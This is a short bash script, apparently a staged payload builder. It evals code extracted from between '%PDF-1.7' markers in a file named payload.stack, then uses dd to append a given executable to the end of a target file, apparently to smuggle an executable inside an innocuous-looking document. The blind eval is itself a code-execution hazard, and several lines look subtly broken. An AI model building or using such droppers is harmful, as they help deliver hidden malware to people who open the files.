#!/bin/bash

elf=$1
target=$2

cp $target "$target.back"

if [[ $elf == "" ]]; then
  echo "Specify executable"
  exit 1
fi


if [[ $target == "" ]]; then
  echo "Specify target"
  exit 1
fi

stage10=$(cat payload.stack)
stage21=$(echo "$stage10" | sed -n '/%PDF-1.7/,/%PDF-1.7/p' | sed '1d;$d')
payload2=$(eval "$stage21")
payload3=$(dd if=$elf of=$target bs=1 seek=$(stat -c%s $target) conv=notrunc)
echo "stage 1 done"
cat "${payload2}0x000x000x00" >> $target
echo "stage 2 done"

echo "All done"